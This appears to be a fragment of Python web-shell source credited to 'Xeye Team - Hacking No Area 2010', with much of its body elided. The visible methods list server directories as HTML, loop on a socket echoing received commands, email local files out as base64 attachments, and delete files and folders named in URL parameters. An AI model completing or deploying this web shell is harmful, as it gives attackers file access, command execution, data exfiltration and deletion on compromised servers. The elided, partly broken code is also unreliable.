...
class XeyeHandle:
    ...
    def listFormatedDir(self, path):
        ...
        for i in allDir:
            if os.path.isdir(i):
                print(
                    '<tr onmouseover="cColor(this)" onmouseout="rColor(this)"><td class="blue">%s</td><td>%s</td><td>-</td><td>%s</td><td>%s</td></tr>' \
        ...
        for i in allDir:
            if not os.path.isdir(i):
                print
                '<tr onmouseover="cColor(this)" onmouseout="rColor(this)"><td class="green">%s</td><td>%s</td><td>%sKB</td><td>%s</td><td>%s</td></tr>' \
    ...
    def startSocket(self):
        ...
        while True:
            ...
            print
            '<font color="#FF0000">your command is:</font><br />'
            print
            bufcmd
            print
            '<br />--------------------------------------<br /><br />'
    ...
    def email(self, _to, _file):
        ...
        try:
            msg = multipart()
            att = text(open(_file, 'rb').read(), 'base64', 'gb2312')
...
try:
    ...
    if del_file:
        try:
            ...
            path = ''
        print(
            __x.delFile(del_file), '| <a href="', __x.url() + '?path=' + path + '">返回</a>')
        print('<br />')
except:
    pass
# delete fold
...
print(
    "<a href='?path=" + os.sep.join(path.split(os.sep)[:-1]) + "'>上级目录</a> | 当前路径（<b>" + path + "</b>）下的资源：<br />")
__x.listFormatedDir(path)

print(
    """<br />(C)<a href="http://xeyeteam.appspot.com/" target="_blank">Xeye Team</a> - Hacking No Area 2010</body>
    </html>""")
